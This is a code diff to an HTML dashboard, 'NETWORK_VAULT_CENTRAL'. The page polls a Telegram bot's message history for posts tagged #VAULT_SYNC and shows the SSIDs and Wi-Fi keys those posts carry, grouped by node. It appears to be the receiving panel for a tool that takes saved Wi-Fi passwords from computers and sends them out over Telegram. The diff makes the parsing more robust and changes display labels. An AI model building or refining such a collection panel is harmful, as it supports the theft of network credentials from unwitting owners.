@@ -10,14 +10,14 @@
     .wifi-table th { text-align: left; font-size: 10px; color: #008f11; padding: 8px; border-bottom: 1px solid #00ff41; }
     .wifi-table td { padding: 8px; font-size: 12px; border-bottom: 1px solid rgba(0, 255, 65, 0.1); }
     .key-text { color: #fff; text-shadow: 0 0 5px #00ff41; }
-    #debug-log { position: fixed; bottom: 0; right: 0; background: rgba(0,0,0,0.9); color: yellow; font-size: 10px; padding: 5px; border-top: 1px solid #333; width: 100%; }
+    #debug-log { position: fixed; bottom: 0; right: 0; background: rgba(0,0,0,0.9); color: yellow; font-size: 10px; padding: 5px; border-top: 1px solid #333; width: 100%; z-index: 100; }
 </style></head>
 <body>
     <canvas id="matrix"></canvas>
     <div class="main-view">
         <h1>NETWORK_VAULT_CENTRAL</h1>
         <div id="vault-content">
-            <p style="color:#008f11;">SYSTEM_READY: WAITING FOR INCOMING DATA...</p>
+            <p style="color:#008f11;">SYSTEM_READY: SCANNING CLOUD NODES...</p>
         </div>
     </div>
     <div id="debug-log">DEBUG: Initializing...</div>
@@ -28,9 +28,9 @@
 
         async function refresh() {
             try {
-                log("Fetching updates from Telegram...");
-                // offset=-100 looks back at the last 100 messages to find the sync tag
-                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=-100&limit=100&allowed_updates=["message"]`);
+                log("Scanning Cloud History...");
+                // Use a large offset to look back through history
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=100&offset=-100`);
                 const json = await res.json();
                 
                 if (!json.ok) { log("API Error: " + json.description); return; }
@@ -38,28 +38,28 @@
                 const container = document.getElementById('vault-content');
                 const results = json.result || [];
                 
-                log("Found " + results.length + " recent updates.");
-
-                // Search for #VAULT_SYNC
-                const syncMsgs = results.filter(m => 
-                    (m.message && m.message.text && m.message.text.includes("#VAULT_SYNC")) ||
-                    (m.channel_post && m.channel_post.text && m.channel_post.text.includes("#VAULT_SYNC"))
-                );
+                // Filter for #VAULT_SYNC in both private chats and channels
+                const syncMsgs = results.filter(m => {
+                    const data = m.message || m.channel_post;
+                    return data && data.text && data.text.includes("#VAULT_SYNC");
+                });
 
                 if (syncMsgs.length > 0) {
-                    log("Sync tag found! Parsing data...");
+                    log("Packet Found! Decrypting...");
+                    // Get the very latest sync message
                     const latest = syncMsgs[syncMsgs.length - 1];
-                    const text = latest.message ? latest.message.text : latest.channel_post.text;
+                    const text = (latest.message || latest.channel_post).text;
                     
-                    const rawJson = text.split('\n')[1];
-                    const data = JSON.parse(rawJson);
+                    // Robust splitting: finds the first line with #VAULT_SYNC and takes everything after
+                    const jsonPart = text.substring(text.indexOf('\n') + 1).trim();
+                    const data = JSON.parse(jsonPart);
                     
                     let html = `
                         <div class="session-block">
                             <h2 class="computer-title">NODE: ${data[0].node}</h2>
-                            <div class="meta">STATUS: CLOUD_SYNC_ACTIVE | UPDATED: ${new Date().toLocaleTimeString()}</div>
+                            <div class="meta">SYSTEM: ONLINE | LAST_SYNC: ${new Date().toLocaleTimeString()}</div>
                             <table class="wifi-table">
-                                <thead><tr><th>SSID</th><th>KEY</th></tr></thead>
+                                <thead><tr><th>SSID</th><th>KEY_DATA</th></tr></thead>
                                 <tbody>`;
                     
                     data.forEach(item => {
@@ -71,17 +71,17 @@
 
                     html += `</tbody></table></div>`;
                     container.innerHTML = html;
-                    log("Display Updated.");
+                    log("Vault Synchronized.");
                 } else {
-                    log("No #VAULT_SYNC tag found in last 100 messages.");
+                    log("No Data Packets found in recent history.");
                 }
             } catch(e) { 
-                log("Error: " + e.message);
+                log("Parse Error: " + e.message);
                 console.error(e); 
             }
         }
 
-        // Matrix Background
+        // Matrix Background Logic
         const c = document.getElementById('matrix'); const ctx = c.getContext('2d');
         c.width = window.innerWidth; c.height = window.innerHeight;
         const s = "01"; const f = 16; const cols = c.width / f; const drops = Array(Math.floor(cols)).fill(1);
